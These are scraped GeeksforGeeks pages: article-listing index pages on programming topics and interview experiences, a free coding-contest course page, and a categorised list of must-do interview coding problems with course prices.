GeeksforGeeks | A computer science portal for geeks | Page 30 Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Structure of C++ Program Last Updated: 15-12-2020 The C++ program is written using a specific template structure. The structure of the program written in C++ language is as follows: Documentation Section: This… Read More » ArticlesC++C++ Programs Capgemini Interview Experience | On-Campus 2020-2021 (Virtual) Last Updated: 16-12-2020 Due to the ongoing pandemic, the placements were all virtual and the rounds were quite interactive and fun and took place on the AON cocubes… Read More » Interview ExperiencesCapgeminiOn-Campus Difference between Program and File Last Updated: 15-12-2020 1. Program : Program, as name suggest, are simple executable files that contain set or collection of instructions used by computer to execute or complete… Read More » Difference BetweenSoftware EngineeringTechnical Scripter 2020 Jivox Interview Experience for DevOps Engineer (On-Campus) Last Updated: 14-12-2020 Jivox is one of the Super-Dream companies that visited VIT in September in the year 2020 for B.Tech placements. Eligibility criteria were 60% or 6… Read More » Interview ExperiencesJivoxOn-Campus How to Iterate HashMap in Java? Last Updated: 15-12-2020 HashMap is a part of Java’s collection providing the basic implementation of the Map interface of Java by storing the data in (Key, Value) pairs… Read More » JavaJava ProgramsJava-HashMap LatentView Interview Experience for Analytics Engineer Last Updated: 14-12-2020 I applied through college and I got the mail for the overall schedule for the recruitment process priorly. It has 6 rounds. All the rounds… Read More » Interview ExperiencesLatentview Zomato Interview Experience for SDE Last Updated: 14-12-2020 I applied On-Campus and my interview happened at the time of the Covid-19 pandemic and the whole process was online. Resume Shortlisting was done and… Read More » Interview ExperiencesOn-CampusZomato Instance Control Flow In Java Last Updated: 15-12-2020 This article will explain how Instance Control Flow takes place whenever objects are created. Instance Control Flow In Normal Class Whenever we are executing a… Read More » JavaTechnical ScripterJava-Object OrientedTechnical Scripter 2020 FileWriter Class in java Last Updated: 15-12-2020 Java FileWriter class of java.io package is used to write data in character form to file. This class inherits from OutputStreamWriter class which in turn… Read More » JavaJava-IO package How to Sort ArrayList using Comparator? Last Updated: 15-12-2020 Comparator is an interface that is used for rearranging the Arraylist in a sorted manner. Comparator is used to sort an ArrayList of User-defined objects.… Read More » JavaJava ProgramsTechnical ScripterJava-ArrayListTechnical Scripter 2020 How to Get All the Values of the LinkedHashMap in Java? Last Updated: 15-12-2020 3.6 LinkedHashMap is a predefined class in Java that is similar to HashMap, contains key and its respective value, unlike HashMap. In LinkedHashMap insertion order is… Read More » JavaJava ProgramsTechnical ScripterJava-LinkedHashMapTechnical Scripter 2020 How to Get a Value From LinkedHashMap by Index in Java? Last Updated: 15-12-2020 3.6 LinkedHashMap is a predefined class in Java which is similar to HashMap, contain key and its respective value unlike HashMap, In LinkedHashMap insertion order is… Read More » JavaJava ProgramsTechnical ScripterJava-LinkedHashMap How to Check if LinkedHashMap Contains a value in Java? Last Updated: 15-12-2020 5 LinkedHashMap is a predefined class in Java which is similar to HashMap, contains key and its respective value unlike HashMap, In LinkedHashMap insertion order is… Read More » JavaJava ProgramsTechnical ScripterJava-LinkedHashMapTechnical Scripter 2020 Barclays Interview Experience | On-Campus 2020 (Virtual) Last Updated: 14-12-2020 Barclays recently visited my college to hire summer analysts for the BA3 position. Eligibility criteria were CGPA > 8 and no active backlogs. 3rd-year students… Read More » Interview ExperiencesBarclaysOn-Campus Accolite Interview Experience (On-Campus) Last Updated: 14-12-2020 Accolite visited our campus for hiring. It had 4 rounds in total. Round 1: First was an MCQ round which had questions from DSA, OS,… Read More » Interview ExperiencesAccoliteOn-Campus Page 30 of 5,465« First«...1020...2829303132...405060...»Last » Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GeeksforGeeks | A computer science portal for geeks | Page 5466 Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Largest Sum Contiguous Subarray Last Updated: 01-08-2020 2.6 Write an efficient program to find the sum of contiguous subarray within a one-dimensional array of numbers which has the largest sum. Recommended: Please solve… Read More » ArraysDynamic Programming24*7 Innovation LabsAccoliteAmazonAmazon-QuestionD-E-ShawFactSetFlipkartHikeHousing.comMakeMyTripMetLifeMicrosoftMorgan StanleyOla CabsOracleOYO RoomsPayuSamsungSnapdealsubarraysubarray-sumTeradataVisaVisa-QuestionVMWareWalmartZoho PHP Program to Find the Number Occurring Odd Number of Times Last Updated: 02-01-2019 Given an array of positive integers. All numbers occur even number of times except one number which occurs odd number of times. Find the number… Read More » PHP Programs C# Program to Find the Number Occurring Odd Number of Times Last Updated: 26-07-2019 Given an array of positive integers. All numbers occur even number of times except one number which occurs the odd number of times. Find the… Read More » C# Programs Python Program to Find the Number Occurring Odd Number of Times Last Updated: 28-10-2019 Given an array of positive integers. All numbers occur even number of times except one number which occurs odd number of times. Find the number… Read More » Python Programs Java Program to Find the Number Occurring Odd Number of Times Last Updated: 30-07-2019 Given an array of positive integers. All numbers occur even number of times except one number which occurs an odd number of times. Find the… Read More » Java Programs C/C++ Program to Find the Number Occurring Odd Number of Times Last Updated: 11-08-2020 1 Given an array arr[] consisting of positive integers that occur even number of times, except one number, which occurs odd number of times. The task… Read More » ArraysC ProgramsC++ ProgramsHashBitwise-XOR Find the Number Occurring Odd Number of Times Last Updated: 01-03-2020 1.7 Given an array of positive integers. All numbers occur even number of times except one number which occurs odd number of times. Find the number… Read More » ArraysBit MagicHashAmazonBitwise-XORSnapdeal Print reverse of a string using recursion Last Updated: 01-05-2019 1.6 Write a recursive function to print reverse of a given string. Program: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to reverse… Read More » Strings Position of rightmost set bit Last Updated: 01-10-2020 2.6 Write a one line function to return position of first 1 from right to left, in binary representation of an Integer. I/P 18, Binary Representation… Read More » Bit MagicAmazon PHP Program to find whether a no is power of two Last Updated: 02-01-2019 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » PHP Programs C# Program to find whether a no is power of two Last Updated: 02-01-2019 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » C# Programs Python Program to find whether a no is power of two Last Updated: 02-01-2019 4 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » Python Programs Java Program to find whether a no is power of two Last Updated: 02-01-2019 2 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » Java Programs C++ Program to find whether a no is power of two Last Updated: 02-01-2019 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » C++ Programs C Program to find whether a no is power of two Last Updated: 02-01-2019 Given a positive integer, write a function to find if it is a power of two or not. Examples : Input : n = 4… Read More » C Programs Page 5,466 of 5,468« First«...102030...5,4645,4655,4665,4675,468» Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Course | Coding Round Contests - Test Series Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Coding Round Contests - Test Series For Product Based Interviews A series of weekly contests designed to emulate the hiring process of Flipkart, Adobe, Paytm, Microsoft, Amazon and Google. Students/Working Professionals Online Course Coding Round Contests - Test Series Active Free Course Login to Sign Up for Free Course Features The course contains coding round contests for 6 major tech companies. i.e.- Flipkart, Adobe, Paytm, Microsoft, Amazon and Google. Each contest contains multiple rounds depending on the company's hiring process. Target one company every week and attempt its contest anytime over the weekend. Each round will imitate an actual interview round focusing on DSA questions. You will have access to hints and time complexities just like in a real interview Course Overview Whether you are a fresher or a working professional planning to prepare for your dream job, this free course is just for you! Come and target one company every week wherein you will be participating in a series of contests that are specifically designed as per the hiring process of major tech companies. The hiring process will be thoroughly explained to you in order for you to give it your best shot. These contests are based on the latest interview experiences posted on GeeksforGeeks by members of our Geek Family who have recently given an interview for that company. What You Will Learn Learn and understand the hiring process of each company. Learn about the type of questions to expect in each company and prepare for them thoroughly. Participate in the mock interview rounds to put your interviewing skills to test Course Content Weekly Plan Week 1 - Flipkart Contains 3 rounds that start on 5th December. Week 2 - Adobe Contains 3 rounds that start on 12th December. Week 3 - Paytm Contains 3 rounds that start on 19th December. Week 4 - Microsoft Contains 3 rounds that start on 26th December. Week 5 - Amazon Contains 4 rounds that start on 2nd January. Week 6 - Google Contains 2 rounds that start on 9th January. FAQs How much does the subscription cost? This course is free. How many hiring rounds will be there for each company? Each company has multiple hiring rounds. Each round will be given to you in the form of a separate contest. When can I attempt the hiring rounds? All the rounds for a company can be attempted anytime over the weekend. (See the weekly plan) How long is each round? Depending on the hiring process, each round will be 45-90 minute long. All the details regarding the contest will be known to you beforehand. You can plan when to attempt it accordingly. How will this help me prepare for coding interviews? We have used the latest interview experiences posted on GeeksforGeeks and carefully curated popular questions asked in each round. The contest will simulate the hiring round for the company. You will be asked to solve 2-3 DSA related questions in the given time frame. Expected time and space complexities will be provided to you just like in a real interview. You will also have access to hints. Just like in a real interview, asking for hints may have a negative impact on your overall score. What are the programming languages supported in the contests? The participants can submit their codes in C++ or Java or Python. Course Registration Active Batches Batch Date Type Register Coding Round Contest 01 December '20 to 12 January '21 Online Classes Login to Register × Coding Round Contests - Test Series Close × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ... - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixPrint all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderWhat is Memory Leak? How can we avoid? Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Last Updated: 10-11-2020 As the placement season is back so are we to help you ace the interview. We have selected some most commonly asked and must do practice problems for you. You can also take part in our mock placement contests which will help you learn different topics and practice at the same time, simulating the feeling of a real placement test environment. Note : Now you can track your progress of these questions Must Do Interview Preparation Course. Topic : Arrays String Linked List Stack and Queue Tree and BST Heap Recursion Hashing Graph Greedy Dynamic Programming Divide and Conquer Backtracking Bit Magic Arrays : Subarray with given sum Count the triplets Kadane’s Algorithm Missing number in array Merge two sorted arrays Rearrange array alternatively Number of pairs Inversion of Array Sort an array of 0s, 1s and 2s Equilibrium point Leaders in an array Minimum Platforms Reverse array in groups K’th smallest element Trapping Rain Water Pythagorean Triplet Chocolate Distribution Problem Stock buy and sell Element with left side smaller and right side greater Convert array into Zig-Zag fashion Last Index of 1 Spirally traversing a matrix Largest Number formed from an Array Solved the above? Go for some more Questions String : Reverse words in a given string Permutations of a given string Longest Palindrome in a String Recursively remove all adjacent duplicates Check if string is rotated by two places Roman Number to Integer Anagram Remove Duplicates Form a Palindrome Longest Distinct Characters in the string Implement Atoi Implement strstr Longest Common Prefix Solved the above? Go for some more Questions Linked List : Finding middle element in a linked list Reverse a linked list Rotate a Linked List Reverse a Linked List in groups of given size Intersection point in Y shaped linked lists Detect Loop in linked list Remove loop in Linked List n’th node from end of linked list Flattening a Linked List Merge two sorted linked lists Intersection point of two Linked Lists Pairwise swap of a linked list Add two numbers represented by linked lists Check if Linked List is Palindrome Implement Queue using Linked List Implement Stack using Linked List Given a linked list of 0s, 1s and 2s, sort it Delete without head pointer Stack and Queue : Parenthesis Checker Next larger element Queue using two Stacks Stack using two queues Get minimum element from stack LRU Cache Circular tour First non-repeating character in a stream Rotten Oranges Maximum of all subarrays of size k Tree : Print Left View of Binary Tree Check for BST Print Bottom View of Binary Tree Print a Binary Tree in Vertical Order Level order traversal in spiral form Connect Nodes at Same Level Lowest Common Ancestor in a BST Convert a given Binary Tree to Doubly Linked List Write Code to Determine if Two Trees are Identical or Not Given a binary tree, check whether it is a mirror of itself Height of Binary Tree Maximum Path Sum Diameter of a Binary Tree Number of leaf nodes Check if given Binary Tree is Height Balanced or Not Serialize and Deserialize a Binary Tree Solved the above? Go for some more Questions Heap : Find median in a stream Heap Sort Operations on Binary Min Heap Rearrange characters Kth largest element in a stream Merge K sorted linked lists Kth largest element in a stream Recursion : Flood fill Algorithm Number of paths Combination Sum – Part 2 Special Keyboard Josephus problem Hashing : Relative Sorting Sorting Elements of an Array by Frequency Largest subarray with 0 sum Common elements Find all four sum numbers Swapping pairs make sum equal Count distinct elements in every window Array Pair Sum Divisibility Problem Longest consecutive subsequence Array Subset of another array Find all pairs with a given sum Find first repeated character Zero Sum Subarrays Minimum indexed character Check if two arrays are equal or not Uncommon characters Smallest window in a string containing all the characters of another string First element to occur k times Check if frequencies can be equal Graph : Depth First Traversal Breadth First Traversal Detect cycle in undirected graph Detect cycle in a directed graph Topological sort Find the number of islands Implementing Dijkstra Minimum Swaps Strongly Connected Components Shortest Source to Destination Path Find whether path exist Minimum Cost Path Circle of Strings Floyd Warshall Alien Dictionary Snake and Ladder Problem Greedy : Activity Selection N meetings in one room Coin Piles Maximize Toys Page Faults in LRU Largest number possible Minimize the heights Minimize the sum of product Huffman Decoding Minimum Spanning Tree Shop in Candy Store Geek collects the balls Dynamic Programming : Minimum Operations Max length chain Minimum number of Coins Longest Common Substring Longest Increasing Subsequence Longest Common Subsequence 0 – 1 Knapsack Problem Maximum sum increasing subsequence Minimum number of jumps Edit Distance Coin Change Problem Subset Sum Problem Box Stacking Rod Cutting Path in Matrix Minimum sum partition Count number of ways to cover a distance Egg Dropping Puzzle Optimal Strategy for a Game Shortest Common Supersequence Divide and Conquer : Find the element that appears once in sorted array Search in a Rotated Array Binary Search Sum of Middle Elements of two sorted arrays Quick Sort Merge Sort K-th element of two sorted Arrays Backtracking : N-Queen Problem Solve the Sudoku Rat in a Maze Problem Word Boggle Generate IP Addresses Bit Magic : Find first set bit Rightmost different bit Check whether K-th bit is set or not Toggle bits given range Set kth bit Power of 2 Bit Difference Rotate Bits Swap all odd and even bits Count total set bits Longest Consecutive 1’s Sparse Number Alone in a couple Maximum subset XOR Some More Questions on Arrays : Find Missing And Repeating Maximum Index Consecutive 1’s not allowed Majority Element Two numbers with sum closest to zero Nuts and Bolts Problem Boolean Matrix Problem Smallest Positive missing number Jumping Caterpillars Some More Questions on Strings : Most frequent word in an array of strings CamelCase Pattern Matching String Ignorance Smallest window in a string containing all the characters of another string Design a tiny URL or URL shortener Permutations of a given string Non Repeating Character Check if strings are rotations of each other or not Save Ironman Repeated Character Remove common characters and concatenate Geek and its Colored Strings Second most repeated string in a sequence Some more Questions on Trees : Mirror Tree Longest consecutive sequence in Binary tree Bottom View of Binary Tree Lowest Common Ancestor in a Binary Tree Binary to DLL Important Links : Difficulty-wise ordered Coding questions for Interview and Competitive Programming Aptitude questions asked in round 1 : Placements Course designed for this purpose. MCQs asked from different computer science subjects : Subject-Wise Quizzes Interview theory and coding questions of all companies : Company wise all practice questions. Interview experiences of all companies : Interview corner. You may also check our latest online course series to learn DS & Algo is named DSA, which covers everything about Data Structures from Basic to Advanced. Key Features of the Course Well organised tutorials on Data-Structures and Algorithms prepared by the GeeksforGeeks Team. Premium video lectures by Mr. Sandeep Jain, Founder and C.E.O of GeeksforGeeks. Dedicated doubt solving team to assist you. Assessment Tests with Video Solutions. Performance-Based Certificate. Internship Opportunities at GeeksforGeeks. The courses are self-paced: Anyone can register anytime, make payment and begin the course. And, many more. The course is available in two versions: With Doubt Assistance: The price of the self-paced online DSA course with doubt assistance is INR 3,999. Click here to purchase your ticket. Without Doubt Assistance: The price of the self-paced online DSA course without doubt assistance is INR 2,499. Click here to purchase your ticket . Preparing for AMAZON SDE Interview? Do check out Geeksforgeeks Amazon SDE Test-Series. The price of the online AMAZON Test-Series course is INR 499. Geeks Classes Live An interview centric Live session focused on DSA to enhance your coding & problem-solving skills for product-based companies. The price of the LIVE Geeks Class course is INR 9,999. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Recommended Posts:Must Do Questions for Companies like TCS, CTS, HCL, IBM …Why companies like Amazon, Microsoft, Google focuses on Data Structures and Algorithms : AnsweredMust Do Coding Questions Company-wiseHow to attempt Function Coding Questions?Guide for Non-CS students to get placed in Software companiesWhat is the future of those students who are getting selected in mass recruiting companiesAmazon Interview QuestionsAmazon’s most frequently asked interview questions | Set 2Must have books for Placements PreparationA Must Do Free Interview Preparation Course by GeeksforGeeksWhy Data Structures and Algorithms are "Must Have" for Developers and Where to learn them : AnsweredPlacement 100 : Complete Interview Preparation package you must have this Placement SeasonTop 3 tips an interviewee must have in mindMinimum number of rabbits that must be present in the forestHow to answer a coding question in an Interview?Practice for cracking any coding interview10 Most asked Questions from Java ProgrammersTop 10 algorithms in Interview QuestionsCommonly asked Interview Questions for Front End DevelopersSQL Interview Questions Article Tags : Articlesinterview-preparationplacement preparation thumb_up 541 To-do Done 3.4 Based on 292 vote(s) Please write to us at 